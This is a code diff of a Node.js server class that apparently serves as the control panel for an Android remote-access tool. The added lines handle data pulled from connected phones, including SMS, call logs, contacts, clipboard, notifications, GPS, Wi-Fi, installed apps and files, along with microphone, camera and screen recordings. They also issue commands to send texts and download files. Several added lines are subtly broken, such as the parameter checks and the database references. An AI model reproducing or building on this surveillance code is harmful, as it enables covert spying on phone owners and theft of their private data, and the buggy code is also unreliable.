@@ -1,29 +1,21 @@
-const CONST = require('./const');
-const fs = require('fs');
-const crypto = require('crypto');
-const path = require('path');
+let CONST = require('./const'),
+    fs = require('fs'),
+    crypto = require('crypto'),
+    path = require('path');
 
 class Clients {
     constructor(db) {
         this.clientConnections = {};
         this.gpsPollers = {};
         this.clientDatabases = {};
-        this.ignoreDisconnects = {};
-        this.instance = this;
         this.db = db;
     }
-
-    // UPDATE
 
     clientConnect(connection, clientID, clientData) {
         this.clientConnections[clientID] = connection;
 
-        this.ignoreDisconnects[clientID] = clientID in this.ignoreDisconnects;
-
-        console.log("Connected -> should ignore?", this.ignoreDisconnects[clientID]);
-
-        let client = this.db.maindb.get('clients').find({ clientID }).value();
-        if (client === undefined) {
+        let client = this.db.maindb.get('clients').find({ clientID });
+        if (client.value() === undefined) {
             this.db.maindb.get('clients').push({
                 clientID,
                 firstSeen: new Date(),
@@ -32,7 +24,7 @@ class Clients {
                 dynamicData: clientData
             }).write();
         } else {
-            this.db.maindb.get('clients').find({ clientID }).assign({
+            client.assign({
                 lastSeen: new Date(),
                 isOnline: true,
                 dynamicData: clientData
@@ -43,106 +35,334 @@ class Clients {
         this.setupListeners(clientID, clientDatabase);
     }
 
-    clientDisconnect(clientID) {
-        console.log("Disconnected -> should ignore?", this.ignoreDisconnects[clientID]);
-
-        if (!this.ignoreDisconnects[clientID]) {
-            logManager.log(CONST.logTypes.info, clientID + " Disconnected");
-            this.db.maindb.get('clients').find({ clientID }).assign({
-                lastSeen: new Date(),
-                isOnline: false,
-            }).write();
-
-            delete this.clientConnections[clientID];
-            clearInterval(this.gpsPollers[clientID]);
-        }
-
-        delete this.ignoreDisconnects[clientID];
-    }
-
     getClientDatabase(clientID) {
-        if (!this.clientDatabases[clientID]) {
+        if (this.clientDatabases[clientID]) return this.clientDatabases[clientID];
+        else {
             this.clientDatabases[clientID] = new this.db.clientdb(clientID);
+            return this.clientDatabases[clientID];
         }
-        return this.clientDatabases[clientID];
     }
 
-    setupListeners(clientID, clientDatabase) {
+    setupListeners(clientID) {
         let socket = this.clientConnections[clientID];
-
-        logManager.log(CONST.logTypes.info, clientID + " Connected");
-
-        socket.on('disconnect', () => this.clientDisconnect(clientID));
-
-        // Run the queued requests for this client
-        let clientQue = clientDatabase.get('CommandQue').value();
-        if (clientQue.length !== 0) {
-            logManager.log(CONST.logTypes.info, clientID + " Running Queued Commands");
-            clientQue.forEach((command) => {
-                let uid = command.uid;
-                this.sendCommand(clientID, command.type, command, (error) => {
-                    if (!error) clientDatabase.get('CommandQue').remove({ uid }).write();
-                    else {
-                        logManager.log(CONST.logTypes.error, clientID + " Queued Command (" + command.type + ") Failed");
-                    }
-                });
-            });
-        }
-
-        // Start GPS polling (if enabled)
-        this.gpsPoll(clientID);
+        let client = this.getClientDatabase(clientID);
 
         socket.on(CONST.messageKeys.screenShot, (data) => {
             if (data.image) {
-                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
-
                 let epoch = Date.now().toString();
                 let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
-                let fileKey = `${hash.substr(0, 5)}-${hash.substr(5, 4)}-${hash.substr(9, 5)}`;
-                let fileExt = (data.name.substring(data.name.lastIndexOf("."))).length !== data.name.length ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';
-                let filePath = path.join(CONST.downloadsFullPath, `${fileKey}${fileExt}`);
-
-                fs.writeFile(filePath, Buffer.from(data.buffer, "base64"), (error) => {
+                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
+                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';
+                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
+                
+                fs.writeFile(filePath, new Buffer(data.buffer, "base64"), (error) => {
                     if (!error) {
-                        clientDatabase.get('downloads').push({
+                        client.get('downloads').push({
                             "time": epoch,
                             "type": "screenShot",
                             "originalName": data.name,
-                            "path": `${CONST.downloadsFolder}/${fileKey}${fileExt}`
+                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
                         }).write();
                     }
-                    else console.error(error);
                 });
             }
         });
 
-        // Add more socket event listeners here...
+        socket.on(CONST.messageKeys.files, (data) => {
+            if (data.type === "list") {
+                let list = data.list;
+                if (list.length !== 0) {
+                    client.get('currentFolder').remove().write();
+                    client.get('currentFolder').assign(data.list).write();
+                }
+            } else if (data.type === "download") {
+                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
+                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
+                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';
+                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
 
-        // Example:
-        // socket.on(CONST.messageKeys.files, (data) => {
-        //     // Handle files message
-        // });
+                fs.writeFile(filePath, data.buffer, (error) => {
+                    if (!error) {
+                        client.get('downloads').push({
+                            time: new Date(),
+                            type: "download",
+                            originalName: data.name,
+                            path: CONST.downloadsFolder + '/' + fileKey + fileExt
+                        }).write();
+                    }
+                });
+            }
+        });
 
-        // Example:
-        // socket.on(CONST.messageKeys.call, (data) => {
-        //     // Handle call message
-        // });
+        socket.on(CONST.messageKeys.call, (data) => {
+            if (data.callsList && data.callsList.length !== 0) {
+                let callsList = data.callsList;
+                let dbCall = client.get('CallData');
+                let newCount = 0;
 
-        // Example:
-        // socket.on(CONST.messageKeys.sms, (data) => {
-        //     // Handle sms message
-        // });
+                callsList.forEach(call => {
+                    let hash = crypto.createHash('md5').update(call.phoneNo + call.date).digest("hex");
+                    if (dbCall.find({ hash }).value() === undefined) {
+                        call.hash = hash;
+                        dbCall.push(call).write();
+                        newCount++;
+                    }
+                });
 
-        // Add more socket event listeners as needed
+                logManager.log(CONST.logTypes.success, clientID + " Call Log Updated - " + newCount + " New Calls");
+            }
+        });
 
-        // End of socket event listeners
+        socket.on(CONST.messageKeys.sms, (data) => {
+            if (typeof data === "object" && data.smslist && data.smslist.length !== 0) {
+                let smsList = data.smslist;
+                let dbSMS = client.get('SMSData');
+                let newCount = 0;
 
+                smsList.forEach(sms => {
+                    let hash = crypto.createHash('md5').update(sms.address + sms.body).digest("hex");
+                    if (dbSMS.find({ hash }).value() === undefined) {
+                        sms.hash = hash;
+                        dbSMS.push(sms).write();
+                        newCount++;
+                    }
+                });
+
+                logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages");
+            } else if (typeof data === "boolean") {
+                logManager.log(CONST.logTypes.success, clientID + " SENT SMS");
+            }
+        });
+
+        socket.on(CONST.messageKeys.mic, (data) => {
+            if (data.file) {
+                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
+
+                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
+                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
+                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';
+
+                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
+
+                fs.writeFile(filePath, data.buffer, (e) => {
+                    if (!e) {
+                        client.get('downloads').push({
+                            "time": new Date(),
+                            "type": "voiceRecord",
+                            "originalName": data.name,
+                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
+                        }).write();
+                    } else {
+                        console.log(e);
+                    }
+                })
+            }
+        });
+
+        socket.on(CONST.messageKeys.location, (data) => {
+            if (Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {
+                client.get('GPSData').push({
+                    time: new Date(),
+                    enabled: data.enabled || false,
+                    latitude: data.latitude || 0,
+                    longitude: data.longitude || 0,
+                    altitude: data.altitude || 0,
+                    accuracy: data.accuracy || 0,
+                    speed: data.speed || 0
+                }).write();
+                logManager.log(CONST.logTypes.success, clientID + " GPS Updated");
+            } else {
+                logManager.log(CONST.logTypes.error, clientID + " GPS Recieved No Data");
+                logManager.log(CONST.logTypes.error, clientID + " GPS LOCATION SOCKET DATA" + JSON.stringify(data));
+            }
+        });
+
+        socket.on(CONST.messageKeys.clipboard, (data) => {
+            client.get('clipboardLog').push({
+                time: new Date(),
+                content: data.text
+            }).write();
+            logManager.log(CONST.logTypes.info, clientID + " ClipBoard Recieved");
+        });
+
+        socket.on(CONST.messageKeys.notification, (data) => {
+            let dbNotificationLog = client.get('notificationLog');
+            let hash = crypto.createHash('md5').update(data.key + data.content).digest("hex");
+
+            if (dbNotificationLog.find({ hash }).value() === undefined) {
+                data.hash = hash;
+                dbNotificationLog.push(data).write();
+                logManager.log(CONST.logTypes.info, clientID + " Notification Recieved");
+            }
+        });
+
+        socket.on(CONST.messageKeys.contacts, (data) => {
+            if (data.contactsList) {
+                if (data.contactsList.length !== 0) {
+                    let contactsList = data.contactsList;
+                    let dbContacts = client.get('contacts');
+                    let newCount = 0;
+                    contactsList.forEach(contact => {
+                        contact.phoneNo = contact.phoneNo.replace(/\s+/g, '');
+                        let hash = crypto.createHash('md5').update(contact.phoneNo + contact.name).digest("hex");
+                        if (dbContacts.find({ hash }).value() === undefined) {
+                            // cool, we dont have this call
+                            contact.hash = hash;
+                            dbContacts.push(contact).write();
+                            newCount++;
+                        }
+                    });
+                    logManager.log(CONST.logTypes.success, clientID + " Contacts Updated - " + newCount + " New Contacts Added");
+                }
+            }
+
+        });
+
+        socket.on(CONST.messageKeys.wifi, (data) => {
+            if (data.networks) {
+                if (data.networks.length !== 0) {
+                    let networks = data.networks;
+                    let dbwifiLog = client.get('wifiLog');
+                    client.get('wifiNow').remove().write();
+                    client.get('wifiNow').assign(data.networks).write();
+                    let newCount = 0;
+                    networks.forEach(wifi => {
+                        let wifiField = dbwifiLog.find({ SSID: wifi.SSID, BSSID: wifi.BSSID });
+                        if (wifiField.value() === undefined) {
+                            // cool, we dont have this call
+                            wifi.firstSeen = new Date();
+                            wifi.lastSeen = new Date();
+                            dbwifiLog.push(wifi).write();
+                            newCount++;
+                        } else {
+                            wifiField.assign({
+                                lastSeen: new Date()
+                            }).write();
+                        }
+                    });
+                    logManager.log(CONST.logTypes.success, clientID + " WiFi Updated - " + newCount + " New WiFi Hotspots Found");
+                }
+            }
+        });
+
+        socket.on(CONST.messageKeys.permissions, (data) => {
+            client.get('enabledPermissions').assign(data.permissions).write();
+            logManager.log(CONST.logTypes.success, clientID + " Permissions Updated");
+        });
+
+        socket.on(CONST.messageKeys.lockDevice, (data) => {
+            client.get('lockDevice').assign(data.lockDevice).write();
+            logManager.log(CONST.logTypes.success, clientID + " Device Locked");
+        });
+
+        socket.on(CONST.messageKeys.screenRecord, (data) => {
+            if (data.file) {
+                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
+                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
+                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
+                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(
+".")) : '.unknown';
+                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
+
+                fs.writeFile(filePath, data.buffer, (e) => {
+                    if (!e) {
+                        client.get('downloads').push({
+                            "time": new Date(),
+                            "type": "screenRecord",
+                            "originalName": data.name,
+                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
+                        }).write();
+                    } else {
+                        console.log(e);
+                    }
+                })
+            }
+        });
+
+        socket.on(CONST.messageKeys.rearCam, (data) => {
+            if (data.file) {
+                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
+                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
+                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
+                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(
+".")) : '.unknown';
+                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
+
+                fs.writeFile(filePath, data.buffer, (e) => {
+                    if (!e) {
+                        client.get('downloads').push({
+                            "time": new Date(),
+                            "type": "rearCam",
+                            "originalName": data.name,
+                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
+                        }).write();
+                    } else {
+                        console.log(e);
+                    }
+                })
+            }
+        });
+
+        socket.on(CONST.messageKeys.frontCam, (data) => {
+            if (data.file) {
+                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
+                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
+                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
+                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(
+".")) : '.unknown';
+                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
+
+                fs.writeFile(filePath, data.buffer, (e) => {
+                    if (!e) {
+                        client.get('downloads').push({
+                            "time": new Date(),
+                            "type": "frontCam",
+                            "originalName": data.name,
+                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
+                        }).write();
+                    } else {
+                        console.log(e);
+                    }
+                })
+            }
+        });
+
+/*        socket.on(CONST.messageKeys.screenShot, (data) => {
+            if (data.file) {
+                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
+                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
+                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
+                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(
+".")) : '.unknown';
+                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
+
+                fs.writeFile(filePath, data.buffer, (e) => {
+                    if (!e) {
+                        client.get('downloads').push({
+                            "time": new Date(),
+                            "type": "screenShot",
+                            "originalName": data.name,
+                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
+                        }).write();
+                    } else {
+                        console.log(e);
+                    }
+                })
+            }
+        });*/
+
+        socket.on(CONST.messageKeys.installed, (data) => {
+            client.get('apps').assign(data.apps).write();
+            logManager.log(CONST.logTypes.success, clientID + " Apps Updated");
+        });
     }
 
-    // GET
 
+    // GET
     getClient(clientID) {
-        return this.db.maindb.get('clients').find({ clientID }).value() || false;
+        let client = this.db.maindb.get('clients').find({ clientID }).value();
+        if (client !== undefined) return client;
+        else return false;
     }
 
     getClientList() {
@@ -150,106 +370,72 @@ class Clients {
     }
 
     getClientListOnline() {
-        return this.db.maindb.get('clients').filter({ isOnline: true }).value();
+        return this.db.maindb.get('clients').value().filter(client => client.isOnline);
     }
-
     getClientListOffline() {
-        return this.db.maindb.get('clients').filter({ isOnline: false }).value();
+        return this.db.maindb.get('clients').value().filter(client => !client.isOnline);
     }
 
     getClientDataByPage(clientID, page, filter = undefined) {
-        let client = this.db.maindb.get('clients').find({ clientID }).value();
+        let client = db.maindb.get('clients').find({ clientID }).value();
         if (client !== undefined) {
             let clientDB = this.getClientDatabase(client.clientID);
             let clientData = clientDB.value();
 
-            switch (page) {
-                case "calls":
-                    let callData = clientDB.get('CallData').sortBy('date').reverse().value();
-                    if (filter) {
-                        callData = callData.filter(call => call.phoneNo.substr(-6) === filter.substr(-6));
-                    }
-                    return callData;
+            let pageData;
 
-                case "sms":
-                    let smsData = clientData.SMSData;
-                    if (filter) {
-                        smsData = smsData.filter(sms => sms.address.substr(-6) === filter.substr(-6));
-                    }
-                    return smsData;
-
-                case "notifications":
-                    let notificationData = clientDB.get('notificationLog').sortBy('postTime').reverse().value();
-                    if (filter) {
-                        notificationData = notificationData.filter(not => not.appName === filter);
-                    }
-                    return notificationData;
-
-                case "wifi":
-                    return {
-                        now: clientData.wifiNow,
-                        log: clientData.wifiLog
-                    };
-
-                case "contacts":
-                    return clientData.contacts;
-
-                case "permissions":
-                    return clientData.enabledPermissions;
-
-                case "clipboard":
-                    return clientDB.get('clipboardLog').sortBy('time').reverse().value();
-
-                case "apps":
-                    return clientData.apps;
-
-                case "files":
-                    return clientData.currentFolder;
-
-                case "downloads":
-                    return clientData.downloads.filter(download => download.type === "download");
-
-                case "microphone":
-                    return clientDB.get('downloads').value().filter(download => download.type === "voiceRecord");
-
-                case "gps":
-                    return clientData.GPSData;
-
-                case "info":
-                    return client;
-
-                case "lockdevice":
-                    return clientData.lockDevice;
-
-                case "screenshot":
-                    return clientDB.get('downloads').value().filter(download => download.type === "screenShot");
-
-                case "screenrecord":
-                    return clientDB.get('downloads').value().filter(download => download.type === "screenRecord");
-
-                case "rearcam":
-                    return clientDB.get('downloads').value().filter(download => download.type === "rearCam");
-
-                case "frontcam":
-                    return clientDB.get('downloads').value().filter(download => download.type === "frontCam");
-
-                default:
-                    return false;
+            if (page === "calls") {
+                pageData = clientDB.get('CallData').sortBy('date').reverse().value();
+                if (filter) {
+                    let filterData = clientDB.get('CallData').sortBy('date').reverse().value().filter(calls => calls.phoneNo.substr(-6) === filter.substr(-6));
+                    if (filterData) pageData = filterData;
+                }
             }
-        } else {
-            return false;
-        }
+            else if (page === "sms") {
+                pageData = clientData.SMSData;
+                if (filter) {
+                    let filterData = clientDB.get('SMSData').value().filter(sms => sms.address.substr(-6) === filter.substr(-6));
+                    if (filterData) pageData = filterData;
+                }
+            }
+            else if (page === "notifications") {
+                pageData = clientDB.get('notificationLog').sortBy('postTime').reverse().value();
+                if (filter) {
+                    let filterData = clientDB.get('notificationLog').sortBy('postTime').reverse().value().filter(not => not.appName === filter);
+                    if (filterData) pageData = filterData;
+                }
+            }
+            else if (page === "wifi") {
+                pageData = {};
+                pageData.now = clientData.wifiNow;
+                pageData.log = clientData.wifiLog;
+            }
+            else if (page === "contacts") pageData = clientData.contacts;
+            else if (page === "permissions") pageData = clientData.enabledPermissions;
+            else if (page === "clipboard") pageData = clientDB.get('clipboardLog').sortBy('time').reverse().value();
+            else if (page === "apps") pageData = clientData.apps;
+            else if (page === "files") pageData = clientData.currentFolder;
+            else if (page === "downloads") pageData = clientData.downloads.filter(download => download.type === "download");
+            else if (page === "microphone") pageData = clientDB.get('downloads').value().filter(download => download.type === "voiceRecord");
+            else if (page === "gps") pageData = clientData.GPSData;
+            else if (page === "info") pageData = client;
+            else if (page === "lockdevice") pageData = clientData.lockDevice;
+            else if (page === "screenshot") pageData = clientDB.get('downloads').value().filter(download => download.type === "screenShot");
+            else if (page === "screenrecord") pageData = clientDB.get('downloads').value().filter(download => download.type === "screenRecord");
+            else if (page === "rearcam") pageData = clientDB.get('downloads').value().filter(download => download.type === "rearCam");
+            else if (page === "frontcam") pageData = clientDB.get('downloads').value().filter(download => download.type === "frontCam");
+
+            return pageData;
+        } else return false;
     }
 
     // DELETE
-
     deleteClient(clientID) {
-        this.db.maindb.get('clients').remove({ clientID }).write();
-        delete this.clientConnections[clientID];
+        this.db.get('clients').remove({ clientID }).write();
+        if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
     }
 
     // COMMAND
-
     sendCommand(clientID, commandID, commandPayload = {}, cb = () => { }) {
         this.checkCorrectParams(commandID, commandPayload, (error) => {
             if (!error) {
@@ -258,14 +444,14 @@ class Clients {
                     commandPayload.type = commandID;
                     if (clientID in this.clientConnections) {
                         let socket = this.clientConnections[clientID];
-                        logManager.log(CONST.logTypes.info, `Requested ${commandID} From ${clientID}`);
-                        socket.emit('order', commandPayload);
+                        logManager.log(CONST.logTypes.info, "Requested " + commandID + " From " + clientID);
+                        socket.emit('order', commandPayload)
                         return cb(false, 'Requested');
                     } else {
                         this.queCommand(clientID, commandPayload, (error) => {
-                            if (!error) return cb(false, 'Command queued (device is offline)');
-                            else return cb(error, undefined);
-                        });
+                            if (!error) return cb(false, 'Command queued (device is offline)')
+                            else return cb(error, undefined)
+                        })
                     }
                 } else return cb('Client Doesn\'t exist!', undefined);
             } else return cb(error, undefined);
@@ -275,46 +461,81 @@ class Clients {
     queCommand(clientID, commandPayload, cb) {
         let clientDB = this.getClientDatabase(clientID);
         let commandQue = clientDB.get('CommandQue');
-        let outstandingCommands = commandQue.value().map(command => command.type);
+        let outstandingCommands = [];
+        commandQue.value().forEach((command) => {
+            outstandingCommands.push(command.type);
+        });
 
-        if (outstandingCommands.includes(commandPayload.type)) {
-            return cb('A similar command has already been queued');
-        } else {
+        if (outstandingCommands.includes(commandPayload.type)) return cb('A similar command has already been queued');
+        else {
+            // yep, it could cause a clash, but c'mon, realistically, it won't, theoretical max que length is like 12 items, so chill?
+            // Talking of clashes, enjoy -> https://www.youtube.com/watch?v=EfK-WX2pa8c
             commandPayload.uid = Math.floor(Math.random() * 10000);
             commandQue.push(commandPayload).write();
-            logManager.log(CONST.logTypes.info, `Queued ${commandPayload.type} For ${clientID}`);
-            return cb(false);
+            return cb(false)
         }
     }
 
     checkCorrectParams(commandID, commandPayload, cb) {
-        switch (commandID) {
-            case CONST.messageKeys.lock:
-                return cb(false);
-
-            case CONST.messageKeys.unlock:
-                return cb(false);
-
-            case CONST.messageKeys.erase:
-                return cb(false);
-
-            default:
-                return cb('Unrecognized Command: ' + commandID);
+        if (commandID === CONST.messageKeys.sms) {
+            if (!('action' in commandPayload)) return cb('SMS Missing `action` Parameter');
+            else {
+                if (commandPayload.action === 'ls') return cb(false);
+                else if (commandPayload.action === 'sendSMS') {
+                    if (!('to' in commandPayload)) return cb('SMS Missing `to` Parameter');
+                    else if (!('sms' in commandPayload)) return cb('SMS Missing `to` Parameter');
+                    else return cb(false);
+                } else return cb('SMS `action` parameter incorrect');
+            }
         }
+        else if (commandID === CONST.messageKeys.files) {
+            if (!('action' in commandPayload)) return cb('Files Missing `action` Parameter');
+            else {
+                if (commandPayload.action === 'ls') {
+                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
+                    else return cb(false);
+                }
+                else if (commandPayload.action === 'dl') {
+                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
+                    else return cb(false);
+                }
+                else return cb('Files `action` parameter incorrect');
+            }
+        }
+        else if (commandID === CONST.messageKeys.mic) {
+            if (!'sec' in commandPayload) return cb('Mic Missing `sec` Parameter')
+            else cb(false)
+        }
+        else if (commandID === CONST.messageKeys.gotPermission) {
+            if (!'permission' in commandPayload) return cb('GotPerm Missing `permission` Parameter')
+            else cb(false)
+        }
+        else if (Object.values(CONST.messageKeys).indexOf(commandID) >= 0) return cb(false)
+        else return cb('Command ID Not Found');
     }
 
     gpsPoll(clientID) {
-        let clientDB = this.getClientDatabase(clientID);
+        if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
 
-        this.gpsPollers[clientID] = setInterval(() => {
-            let lastGPS = clientDB.get('GPSData').sortBy('date').reverse().value()[0];
-            if (lastGPS !== undefined) {
-                let now = new Date();
-                if (lastGPS.date < now.getTime() - (CONST.gpsInterval * 1000)) {
-                    this.sendCommand(clientID, CONST.messageKeys.gpsPoll, { until: now.getTime() + (CONST.gpsInterval * 1000) });
-                }
-            }
-        }, CONST.gpsInterval * 1000);
+        let clientDB = this.getClientDatabase(clientID);
+        let gpsSettings = clientDB.get('GPSSettings').value();
+
+        if (gpsSettings.updateFrequency > 0) {
+            this.gpsPollers[clientID] = setInterval(() => {
+                logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - GPS");
+                this.sendCommand(clientID, '0xLO')
+            }, gpsSettings.updateFrequency * 1000);
+        }
+    }
+
+    setGpsPollSpeed(clientID, pollevery, cb) {
+        if (pollevery >= 30) {
+            let clientDB = this.getClientDatabase(clientID);
+            clientDB.get('GPSSettings').assign({ updateFrequency: pollevery }).write();
+            cb(false);
+            this.gpsPoll(clientID);
+        } else return cb('Polling Too Short!')
+
     }
 }
 
